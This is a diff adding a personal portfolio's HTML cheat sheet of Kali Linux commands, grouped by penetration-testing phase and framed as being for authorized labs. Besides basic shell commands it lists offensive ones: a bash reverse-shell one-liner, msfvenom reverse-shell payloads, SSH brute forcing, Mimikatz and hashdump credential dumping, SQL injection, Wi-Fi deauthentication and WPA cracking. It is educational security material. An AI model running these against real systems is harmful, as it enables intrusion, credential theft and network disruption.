@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux CLI Cheat Sheet | Daniel Fernandez</title>
+<meta name="description" content="Daniel Fernandez's Kali Linux command-line cheat sheet, organized by engagement phase. For authorized lab use only.">
+<link rel="icon" href="favicon.png">
+<link rel="stylesheet" href="styles.css">
+<style>
+.cmd-list { list-style: none; }
+.cmd-list li { margin-bottom: 0.55rem; padding: 0.5rem 0.8rem; background: #05080d;
+  border: 1px solid var(--border); border-radius: 6px; font-size: 0.9rem; }
+.cmd-list code { color: var(--accent); font-family: var(--mono); font-size: 0.85rem;
+  display: block; margin-bottom: 0.15rem; word-break: break-all; }
+.cmd-list span { color: var(--muted); font-size: 0.85rem; }
+.cheatsheet blockquote { border-left: 3px solid var(--amber); padding: 0.8rem 1.2rem;
+  background: rgba(255,180,84,0.06); border-radius: 0 8px 8px 0; margin: 1rem 0 1.5rem; font-size: 0.92rem; }
+.cheatsheet h3 { color: var(--accent); font-family: var(--mono); font-size: 1rem; margin: 1.4rem 0 0.8rem; }
+.cheatsheet hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav class="nav">
+  <a href="index.html" class="nav-brand"><span class="prompt">&gt;_</span> dfernandez</a>
+  <div class="nav-links" style="display:flex">
+    <a href="index.html">← Home</a>
+    <a href="index.html#writeups">Writeups</a>
+  </div>
+</nav>
+<main class="cheatsheet" style="max-width:860px;margin:0 auto;padding:2.5rem 1.5rem 3rem">
+  <a href="index.html" class="back-link">← back to portfolio</a>
+  <h1>📟 Kali Linux CLI Cheat Sheet</h1>
+  <p class="section-sub">Organized by engagement phase. Verified commands — built from scratch.</p>
+<blockquote><strong>Ethics first:</strong> These commands are for labs, CTFs, and systems you have explicit written permission to test — TryHackMe, HackTheBox, VulnHub, or your own VM lab. Never run them against targets you don&#x27;t own or aren&#x27;t authorized to test.</blockquote>
+<hr>
+<h2>Daily Driver — file ops, networking, text processing</h2>
+<h3>Navigation &amp; files</h3>
+<ul class="cmd-list">
+<li><code>pwd</code><span>show your current directory</span></li>
+<li><code>ls -la</code><span>list all files, including hidden ones, with details</span></li>
+<li><code>cd /path</code> / <code>cd ..</code> — move into a directory / go up one level</li>
+<li><code>find /path -name &quot;*.txt&quot; 2&gt;/dev/null</code><span>search for files by name, hiding permission errors</span></li>
+<li><code>locate filename</code><span>fast filename search (run `updatedb` first to refresh its index)</span></li>
+<li><code>cp -r src/ dst/</code><span>copy files or whole directories</span></li>
+<li><code>mv old new</code><span>move or rename files</span></li>
+<li><code>rm -rf dir/</code><span>delete a directory and everything in it (no undo — be careful)</span></li>
+<li><code>mkdir -p a/b/c</code><span>create nested directories in one shot</span></li>
+<li><code>touch file</code><span>create an empty file or update its timestamp</span></li>
+<li><code>chmod +x script.sh</code><span>make a file executable</span></li>
+<li><code>chown user:group file</code><span>change a file&#x27;s owner and group</span></li>
+<li><code>tar -xzvf file.tar.gz</code><span>extract a .tar.gz archive</span></li>
+<li><code>unzip file.zip</code><span>extract a .zip archive</span></li>
+</ul>
+<h3>Viewing &amp; processing text</h3>
+<ul class="cmd-list">
+<li><code>cat file</code><span>print a whole file to the screen</span></li>
+<li><code>less file</code><span>scroll through a file page by page (q to quit)</span></li>
+<li><code>head -n 20 file</code> / <code>tail -n 20 file</code> — show the first / last 20 lines</li>
+<li><code>tail -f /var/log/auth.log</code><span>watch a log file update in real time</span></li>
+<li><code>grep -r &quot;password&quot; . 2&gt;/dev/null</code><span>search every file under here for a string</span></li>
+<li><code>grep -i &quot;pattern&quot; file</code><span>case-insensitive search in one file</span></li>
+<li><code>cut -d: -f1 /etc/passwd</code><span>print the first colon-separated field of each line</span></li>
+<li><code>awk &#x27;{print $1, $3}&#x27; file</code><span>print the 1st and 3rd whitespace-separated columns</span></li>
+<li><code>sort file | uniq -c | sort -nr</code><span>count how often each unique line appears, most common first</span></li>
+<li><code>wc -l file</code><span>count the lines in a file</span></li>
+<li><code>strings binary</code><span>pull readable text out of a binary file</span></li>
+</ul>
+<h3>Networking basics</h3>
+<ul class="cmd-list">
+<li><code>ip a</code><span>show your interfaces and IP addresses</span></li>
+<li><code>ip r</code><span>show the routing table (reveals the gateway)</span></li>
+<li><code>ping -c 4 10.0.0.1</code><span>send 4 pings to check connectivity</span></li>
+<li><code>ss -tuln</code><span>list all listening TCP/UDP ports on this machine</span></li>
+<li><code>curl -I https://target</code><span>fetch just the HTTP headers from a site</span></li>
+<li><code>curl -s https://target | head -c 500</code><span>quietly grab the first 500 bytes of a page</span></li>
+<li><code>wget http://target/file</code><span>download a file over HTTP</span></li>
+<li><code>ssh user@10.0.0.5 -i key.pem</code><span>SSH in using a private key file</span></li>
+<li><code>scp file user@10.0.0.5:/tmp/</code><span>securely copy a file to a remote host</span></li>
+<li><code>python3 -m http.server 8000</code><span>serve the current directory over HTTP (handy for transferring files to a target)</span></li>
+<li><code>nc -lvnp 4444</code><span>netcat listener: wait for an incoming connection on port 4444</span></li>
+<li><code>nc 10.0.0.5 4444</code><span>connect to a host on port 4444</span></li>
+</ul>
+<hr>
+<h2>Recon &amp; Enumeration</h2>
+<h3>Host &amp; port discovery</h3>
+<ul class="cmd-list">
+<li><code>nmap -sn 192.168.1.0/24</code><span>ping sweep: find which hosts are alive on the subnet</span></li>
+<li><code>nmap -sS -Pn 10.0.0.5</code><span>stealth SYN scan without host discovery (avoids ping-based detection)</span></li>
+<li><code>nmap -sV -sC -O -p- 10.0.0.5</code><span>full port scan with service/version detection, default scripts, and OS fingerprinting</span></li>
+<li><code>nmap -A 10.0.0.5</code><span>aggressive scan: OS, versions, scripts, traceroute in one go</span></li>
+<li><code>nmap -sU --top-ports 20 10.0.0.5</code><span>scan the 20 most common UDP ports (slow but often overlooked)</span></li>
+<li><code>nmap -oN scan.txt 10.0.0.5</code><span>save scan results to a text file</span></li>
+<li><code>masscan -p1-65535 10.0.0.0/24 --rate=1000</code><span>extremely fast scan of all 65k ports across a subnet</span></li>
+</ul>
+<h3>Web enumeration</h3>
+<ul class="cmd-list">
+<li><code>whatweb http://10.0.0.5</code><span>fingerprint the technologies a website runs on</span></li>
+<li><code>gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt</code><span>brute-force hidden directories and files</span></li>
+<li><code>ffuf -u http://10.0.0.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt</code><span>fast web fuzzer for paths, params, or vhosts</span></li>
+<li><code>nikto -h http://10.0.0.5</code><span>scan a web server for known misconfigurations and outdated software</span></li>
+<li><code>wpscan --url http://10.0.0.5</code><span>enumerate WordPress users, plugins, themes, and known vulns</span></li>
+<li><code>nuclei -u http://10.0.0.5</code><span>run community vulnerability templates against a target</span></li>
+</ul>
+<h3>SMB / Windows / network services</h3>
+<ul class="cmd-list">
+<li><code>enum4linux -a 10.0.0.5</code><span>enumerate everything SMB: users, shares, policies, OS info</span></li>
+<li><code>smbclient -L //10.0.0.5</code><span>list the SMB shares on a host</span></li>
+<li><code>smbclient //10.0.0.5/share -U guest</code><span>connect to an SMB share as a user</span></li>
+<li><code>rpcclient -U &quot;&quot; -N 10.0.0.5</code><span>open a null-session RPC connection to query users and groups</span></li>
+<li><code>ldapsearch -x -h 10.0.0.5 -s base</code><span>query the LDAP root for directory info</span></li>
+<li><code>snmpwalk -c public -v2c 10.0.0.5</code><span>walk the SNMP tree with the default community string</span></li>
+</ul>
+<h3>DNS &amp; OSINT</h3>
+<ul class="cmd-list">
+<li><code>dig target.com any</code><span>pull all DNS records for a domain</span></li>
+<li><code>host -t mx target.com</code><span>look up a domain&#x27;s mail servers</span></li>
+<li><code>nslookup target.com</code><span>simple DNS lookup</span></li>
+<li><code>dnsenum target.com</code><span>brute-force subdomains and zone-transfer attempts</span></li>
+<li><code>whois target.com</code><span>registration and ownership details for a domain</span></li>
+<li><code>theHarvester -d target.com -b google</code><span>harvest emails, subdomains, and names from public sources</span></li>
+</ul>
+<hr>
+<h2>Exploitation</h2>
+<h3>Metasploit workflow</h3>
+<ul class="cmd-list">
+<li><code>msfconsole</code><span>launch the Metasploit Framework console</span></li>
+<li><code>search smb</code><span>search loaded modules by keyword (inside msfconsole)</span></li>
+<li><code>use exploit/...</code><span>select a module to work with</span></li>
+<li><code>show options</code><span>see what the module needs configured</span></li>
+<li><code>set RHOSTS 10.0.0.5</code> / <code>set LHOST 10.0.0.10</code> — set target and your callback address</li>
+<li><code>run</code> (or <code>exploit</code>) — launch the module</li>
+</ul>
+<h3>Payload generation</h3>
+<ul class="cmd-list">
+<li><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf</code><span>build a Linux reverse-shell payload</span></li>
+<li><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe</code><span>build a Windows reverse-shell payload</span></li>
+</ul>
+<h3>Finding &amp; using exploits</h3>
+<ul class="cmd-list">
+<li><code>searchsploit apache 2.4</code><span>search the local Exploit-DB copy by software and version</span></li>
+<li><code>searchsploit -m 12345</code><span>copy exploit #12345 into your current directory</span></li>
+</ul>
+<h3>Credential attacks</h3>
+<ul class="cmd-list">
+<li><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5 -t 4</code><span>brute-force SSH login with 4 parallel tasks</span></li>
+<li><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code><span>crack password hashes with John the Ripper</span></li>
+<li><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code><span>GPU-accelerated cracking (mode 0 = MD5, attack 0 = dictionary)</span></li>
+</ul>
+<h3>Web exploitation</h3>
+<ul class="cmd-list">
+<li><code>sqlmap -u &quot;http://10.0.0.5/page?id=1&quot; --dbs</code><span>test a URL parameter for SQL injection and list databases</span></li>
+<li><code>sqlmap -u &quot;http://10.0.0.5/page?id=1&quot; -D dbname --tables</code><span>list tables inside a database once injection is confirmed</span></li>
+</ul>
+<h3>Shells</h3>
+<ul class="cmd-list">
+<li><code>nc -lvnp 4444</code><span>catch an incoming reverse shell on your machine</span></li>
+<li><code>/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.10/4444 0&gt;&amp;1</code><span>classic bash reverse shell one-liner (run on the target)</span></li>
+<li><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</code><span>upgrade a dumb shell to a proper interactive TTY</span></li>
+</ul>
+<hr>
+<h2>Post-Exploitation</h2>
+<h3>Situational awareness (run on the compromised host)</h3>
+<ul class="cmd-list">
+<li><code>whoami</code> / <code>id</code> — who are you and what groups are you in</li>
+<li><code>hostname</code> / <code>uname -a</code> — machine name and kernel/OS version</li>
+<li><code>ps aux</code><span>list all running processes (look for odd ones)</span></li>
+<li><code>ss -tulnp</code><span>listening ports and which process owns each</span></li>
+<li><code>env</code><span>environment variables (sometimes hold credentials)</span></li>
+<li><code>history</code><span>previously typed commands (often leak passwords)</span></li>
+</ul>
+<h3>Privilege escalation recon</h3>
+<ul class="cmd-list">
+<li><code>sudo -l</code><span>show what you can run as root without a password</span></li>
+<li><code>find / -perm -4000 -type f 2&gt;/dev/null</code><span>find SUID binaries (a classic privesc path)</span></li>
+<li><code>cat /etc/crontab</code> / <code>crontab -l</code> — scheduled tasks that may run as root</li>
+<li><code>ls -la /etc/shadow</code><span>check whether the password hash file is readable</span></li>
+<li><code>linpeas.sh</code><span>run LinPEAS, the go-to automated Linux privesc enumeration script</span></li>
+</ul>
+<h3>Meterpreter (once you have a Meterpreter session)</h3>
+<ul class="cmd-list">
+<li><code>getuid</code> / <code>sysinfo</code> — current user and system details</li>
+<li><code>getsystem</code><span>attempt automatic privilege escalation to SYSTEM/root</span></li>
+<li><code>migrate &lt;PID&gt;</code><span>move into a more stable process</span></li>
+<li><code>hashdump</code><span>dump local password hashes</span></li>
+<li><code>upload / download</code><span>move files to and from the target</span></li>
+</ul>
+<h3>Pivoting &amp; lateral movement</h3>
+<ul class="cmd-list">
+<li><code>ssh -D 9050 user@10.0.0.5</code><span>open a SOCKS proxy through a compromised host for pivoting</span></li>
+<li><code>proxychains nmap -sT 10.1.0.0/24</code><span>scan an internal subnet through your proxy (configure /etc/proxychains.conf first)</span></li>
+<li><code>bloodhound-python -u user -p &#x27;pass&#x27; -d domain.local -c all -ns 10.0.0.5</code><span>collect Active Directory data for BloodHound attack-path mapping</span></li>
+<li><code>sekurlsa::logonpasswords</code><span>dump plaintext credentials from memory (Mimikatz, on Windows targets)</span></li>
+</ul>
+<hr>
+<h2>Wireless</h2>
+<h3>Setup</h3>
+<ul class="cmd-list">
+<li><code>iwconfig</code><span>check wireless interfaces and their mode</span></li>
+<li><code>airmon-ng check kill</code><span>kill processes that interfere with monitor mode</span></li>
+<li><code>airmon-ng start wlan0</code><span>put the adapter into monitor mode (becomes wlan0mon)</span></li>
+</ul>
+<h3>Survey &amp; capture</h3>
+<ul class="cmd-list">
+<li><code>airodump-ng wlan0mon</code><span>passively list nearby networks, clients, and channels</span></li>
+<li><code>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</code><span>lock onto one network&#x27;s channel and save its traffic to files</span></li>
+<li><code>aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code><span>send 5 deauth frames to force a client to reconnect (captures the WPA handshake)</span></li>
+</ul>
+<h3>Cracking</h3>
+<ul class="cmd-list">
+<li><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code><span>dictionary-attack a captured WPA handshake</span></li>
+<li><code>hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1</code><span>capture PMKIDs (no clients needed)</span></li>
+<li><code>hcxpcapngtool -o hashes.hc22000 dump.pcapng</code><span>convert the capture into Hashcat format</span></li>
+<li><code>hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt</code><span>crack WPA handshakes/PMKIDs on the GPU</span></li>
+</ul>
+<h3>Other tools</h3>
+<ul class="cmd-list">
+<li><code>wifite</code><span>automated wireless auditing: scans, captures, and cracks with minimal input</span></li>
+<li><code>reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv</code><span>attack WPS PIN on routers that leave WPS enabled</span></li>
+</ul>
+<hr>
+<p>*Keep this file as your desk reference. Pair it with a Kali VM and legal labs (TryHackMe, HackTheBox) to practice each phase hands-on.*</p>
+  <hr>
+  <p class="fineprint">© 2026 Daniel Fernandez · For labs, CTFs, and authorized targets only.</p>
+</main>
+<script src="script.js"></script>
+</body>
+</html>
